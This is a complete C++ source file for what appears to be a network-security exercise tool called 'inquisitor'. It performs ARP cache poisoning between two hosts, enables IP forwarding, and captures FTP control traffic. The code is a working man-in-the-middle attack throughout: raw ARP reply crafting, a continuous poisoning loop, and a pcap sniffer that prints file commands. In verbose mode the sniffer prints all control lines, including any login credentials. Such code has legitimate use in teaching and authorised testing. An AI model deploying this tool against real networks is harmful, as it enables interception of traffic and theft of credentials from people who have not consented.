#include "inquisitor.hpp"

// ─── Global state ─────────────────────────────────────────────────────────────

static std::string           g_ifname;
static std::string           g_ipSrc,    g_macSrc;
static std::string           g_ipTarget, g_macTarget;
static uint8_t               g_ownMac[6];
static bool                  g_verbose = false;
static volatile sig_atomic_t g_running = 1;
static pcap_t               *g_handle  = nullptr;
static std::thread           g_poisonThread;

// ─── Input validation ─────────────────────────────────────────────────────────

static bool parseMac(const std::string &s, uint8_t out[6]) {
    unsigned int b[6] = {};
    if (sscanf(s.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
               &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) == 6 ||
        sscanf(s.c_str(), "%02x-%02x-%02x-%02x-%02x-%02x",
               &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) == 6) {
        for (int i = 0; i < 6; ++i) out[i] = static_cast<uint8_t>(b[i]);
        return true;
    }
    return false;
}

static bool validateIpv4(const std::string &s) {
    struct in_addr addr;
    return inet_pton(AF_INET, s.c_str(), &addr) == 1;
}

// ─── Network helpers ──────────────────────────────────────────────────────────

// Return the first non-loopback IPv4 interface name.
static std::string getInterface() {
    struct ifaddrs *ifa = nullptr;
    if (getifaddrs(&ifa) == -1)
        return "eth0";
    for (struct ifaddrs *p = ifa; p; p = p->ifa_next) {
        if (!p->ifa_addr || p->ifa_addr->sa_family != AF_INET)
            continue;
        std::string name(p->ifa_name);
        if (name != "lo") {
            freeifaddrs(ifa);
            return name;
        }
    }
    freeifaddrs(ifa);
    return "eth0";
}

static bool getOwnMac(const std::string &ifname, uint8_t mac[6]) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return false;
    struct ifreq ifr{};
    strncpy(ifr.ifr_name, ifname.c_str(), IFNAMSIZ - 1);
    bool ok = (ioctl(s, SIOCGIFHWADDR, &ifr) == 0);
    if (ok) memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(s);
    return ok;
}

static std::string macToStr(const uint8_t mac[6]) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return std::string(buf);
}

// ─── ARP packet sending ───────────────────────────────────────────────────────
//
// Sends an ARP reply (opcode 2) claiming:
//   "senderIp is at senderMac"
// The packet is delivered to targetMac (holder of targetIp).
//
static void sendArpReply(int sock,
                         const uint8_t senderMac[6], const char *senderIp,
                         const uint8_t targetMac[6], const char *targetIp) {
    // 14-byte Ethernet header + 28-byte ARP payload = 42 bytes
    uint8_t pkt[42] = {};

    // Ethernet header
    memcpy(pkt + 0, targetMac,  6);   // dst
    memcpy(pkt + 6, senderMac, 6);   // src
    pkt[12] = 0x08; pkt[13] = 0x06;  // EtherType: ARP

    // ARP payload (RFC 826)
    pkt[14] = 0x00; pkt[15] = 0x01;  // HTYPE: Ethernet
    pkt[16] = 0x08; pkt[17] = 0x00;  // PTYPE: IPv4
    pkt[18] = 0x06;                   // HLEN
    pkt[19] = 0x04;                   // PLEN
    pkt[20] = 0x00; pkt[21] = 0x02;  // OPER: reply
    memcpy(pkt + 22, senderMac, 6);  // SHA: sender hardware addr
    inet_pton(AF_INET, senderIp,  pkt + 28); // SPA: sender protocol addr
    memcpy(pkt + 32, targetMac, 6);  // THA: target hardware addr
    inet_pton(AF_INET, targetIp,  pkt + 38); // TPA: target protocol addr

    struct ifreq ifr{};
    strncpy(ifr.ifr_name, g_ifname.c_str(), IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl SIOCGIFINDEX");
        return;
    }

    struct sockaddr_ll sa{};
    sa.sll_family  = AF_PACKET;
    sa.sll_ifindex = ifr.ifr_ifindex;
    sa.sll_halen   = ETH_ALEN;
    memcpy(sa.sll_addr, targetMac, 6);

    if (sendto(sock, pkt, sizeof(pkt), 0,
               reinterpret_cast<struct sockaddr *>(&sa), sizeof(sa)) < 0)
        perror("sendto ARP");
}

// ─── ARP poisoning thread ─────────────────────────────────────────────────────

static void poisonLoop() {
    uint8_t srcMac[6], tgtMac[6];
    parseMac(g_macSrc,    srcMac);
    parseMac(g_macTarget, tgtMac);

    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) { perror("socket AF_PACKET (poison)"); return; }

    std::cout << "[*] ARP poisoning running — CTRL+C to stop\n";

    while (g_running) {
        // Tell src:    "targetIP is at g_ownMac"  (we impersonate target)
        sendArpReply(sock, g_ownMac, g_ipTarget.c_str(), srcMac, g_ipSrc.c_str());
        // Tell target: "srcIP is at g_ownMac"     (we impersonate source)
        sendArpReply(sock, g_ownMac, g_ipSrc.c_str(),    tgtMac, g_ipTarget.c_str());
        sleep(2);
    }
    close(sock);
}

// ─── ARP table restoration ────────────────────────────────────────────────────

static void restoreArp() {
    uint8_t srcMac[6], tgtMac[6];
    parseMac(g_macSrc,    srcMac);
    parseMac(g_macTarget, tgtMac);

    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) { perror("socket AF_PACKET (restore)"); return; }

    std::cout << "[*] Restoring ARP tables...\n";
    for (int i = 0; i < 5; ++i) {
        // Tell src:    "targetIP is really at tgtMac"
        sendArpReply(sock, tgtMac, g_ipTarget.c_str(), srcMac, g_ipSrc.c_str());
        // Tell target: "srcIP is really at srcMac"
        sendArpReply(sock, srcMac, g_ipSrc.c_str(),    tgtMac, g_ipTarget.c_str());
        usleep(100'000);
    }
    close(sock);
    std::cout << "[*] ARP tables restored.\n";
}

// ─── FTP packet handler ───────────────────────────────────────────────────────

static void packetHandler(u_char * /*user*/,
                          const struct pcap_pkthdr *hdr,
                          const u_char *pkt) {
    // Skip Ethernet header (14 bytes)
    if (hdr->caplen < 14) return;
    const u_char *ip = pkt + 14;

    // Must be IPv4
    if ((ip[0] >> 4) != 4) return;
    uint32_t ipHdrLen = static_cast<uint32_t>((ip[0] & 0x0f) * 4);
    if (hdr->caplen < 14 + ipHdrLen + 20) return;
    if (ip[9] != 6) return; // must be TCP

    // Skip TCP header
    const u_char *tcp   = ip + ipHdrLen;
    uint32_t tcpHdrLen  = static_cast<uint32_t>(((tcp[12] >> 4) & 0x0f) * 4);
    uint32_t payloadOff = 14 + ipHdrLen + tcpHdrLen;
    if (hdr->caplen <= payloadOff) return;

    uint32_t    payloadLen = hdr->caplen - payloadOff;
    const char *payload    = reinterpret_cast<const char *>(pkt + payloadOff);
    std::string data(payload, payloadLen);

    // Ports and IPs
    uint16_t srcPort = static_cast<uint16_t>((tcp[0] << 8) | tcp[1]);
    uint16_t dstPort = static_cast<uint16_t>((tcp[2] << 8) | tcp[3]);
    char srcIp[INET_ADDRSTRLEN], dstIp[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, ip + 12, srcIp, sizeof(srcIp));
    inet_ntop(AF_INET, ip + 16, dstIp, sizeof(dstIp));

    // Strip trailing CR/LF
    while (!data.empty() && (data.back() == '\r' || data.back() == '\n'))
        data.pop_back();
    if (data.empty()) return;

    if (g_verbose) {
        // Show all FTP control traffic in both directions
        std::cout << "[FTP] " << srcIp << ":" << srcPort
                  << " -> " << dstIp << ":" << dstPort
                  << "  |  " << data << "\n";
    } else {
        // Show only file-relevant commands (client → server)
        if (dstPort != 21) return;
        static const std::vector<std::string> fileCmds = {
            "STOR ", "RETR ", "LIST", "NLST", "RNFR ", "RNTO "
        };
        for (const auto &cmd : fileCmds) {
            if (data.size() >= cmd.size() &&
                data.compare(0, cmd.size(), cmd) == 0) {
                std::cout << "[FTP] " << srcIp << " -> " << dstIp
                          << "  |  " << data << "\n";
                break;
            }
        }
    }
}

// ─── Signal handler ───────────────────────────────────────────────────────────

static void handleSignal(int sig) {
    if (sig == SIGINT) {
        write(STDOUT_FILENO, "\n[!] Caught SIGINT, stopping...\n", 32);
        g_running = 0;
        if (g_handle)
            pcap_breakloop(g_handle);
    }
}

// ─── Entry point ──────────────────────────────────────────────────────────────

int main(int argc, char *argv[]) {
    // Collect positional args; pick up -v anywhere
    std::vector<std::string> args;
    for (int i = 1; i < argc; ++i) {
        if (std::string(argv[i]) == "-v") g_verbose = true;
        else args.push_back(argv[i]);
    }

    if (args.size() != 4) {
        std::cerr << "Usage: " << argv[0]
                  << " [-v] <IP-src> <MAC-src> <IP-target> <MAC-target>\n";
        return 1;
    }

    g_ipSrc     = args[0];
    g_macSrc    = args[1];
    g_ipTarget  = args[2];
    g_macTarget = args[3];

    // Validate IPv4 addresses
    if (!validateIpv4(g_ipSrc)) {
        std::cerr << "Error: invalid source IPv4: " << g_ipSrc << "\n";
        return 1;
    }
    if (!validateIpv4(g_ipTarget)) {
        std::cerr << "Error: invalid target IPv4: " << g_ipTarget << "\n";
        return 1;
    }

    // Validate MAC addresses
    uint8_t tmp[6];
    if (!parseMac(g_macSrc, tmp)) {
        std::cerr << "Error: invalid source MAC: " << g_macSrc << "\n";
        return 1;
    }
    if (!parseMac(g_macTarget, tmp)) {
        std::cerr << "Error: invalid target MAC: " << g_macTarget << "\n";
        return 1;
    }

    // Detect interface and our own MAC
    g_ifname = getInterface();
    if (!getOwnMac(g_ifname, g_ownMac)) {
        std::cerr << "Error: cannot get MAC for interface " << g_ifname << "\n";
        return 1;
    }

    std::cout << "[*] Interface : " << g_ifname
              << "  (" << macToStr(g_ownMac) << ")\n"
              << "[*] Source    : " << g_ipSrc    << "  " << g_macSrc    << "\n"
              << "[*] Target    : " << g_ipTarget  << "  " << g_macTarget  << "\n";
    if (g_verbose)
        std::cout << "[*] Verbose   : ON\n";

    // Enable IP forwarding so we actually relay traffic
    {
        std::ofstream ipfwd("/proc/sys/net/ipv4/ip_forward");
        if (ipfwd) ipfwd << "1\n";
        else std::cerr << "Warning: could not enable IP forwarding\n";
    }

    std::signal(SIGINT, handleSignal);

    // Start ARP poisoning thread (full duplex)
    g_poisonThread = std::thread(poisonLoop);

    // Open pcap on the detected interface
    char errbuf[PCAP_ERRBUF_SIZE];
    g_handle = pcap_open_live(g_ifname.c_str(), BUFSIZ, 1, 1000, errbuf);
    if (!g_handle) {
        std::cerr << "Error: pcap_open_live: " << errbuf << "\n";
        g_running = 0;
        if (g_poisonThread.joinable()) g_poisonThread.join();
        return 2;
    }

    // BPF filter: only FTP control traffic between the two hosts
    std::string filter = "tcp port 21 and (host " + g_ipSrc +
                         " or host " + g_ipTarget + ")";
    struct bpf_program fp{};
    if (pcap_compile(g_handle, &fp, filter.c_str(), 0, PCAP_NETMASK_UNKNOWN) == 0) {
        if (pcap_setfilter(g_handle, &fp) != 0)
            std::cerr << "Warning: pcap_setfilter: " << pcap_geterr(g_handle) << "\n";
        pcap_freecode(&fp);
    } else {
        std::cerr << "Warning: pcap_compile: " << pcap_geterr(g_handle) << "\n";
    }

    std::cout << "[*] Sniffing FTP traffic between "
              << g_ipSrc << " and " << g_ipTarget << "...\n";

    // Blocking capture loop — exits via pcap_breakloop() on SIGINT
    pcap_loop(g_handle, 0, packetHandler, nullptr);
    pcap_close(g_handle);
    g_handle = nullptr;

    // Wait for poison thread to finish its current sleep cycle
    g_running = 0;
    if (g_poisonThread.joinable()) g_poisonThread.join();

    restoreArp();
    return 0;
}
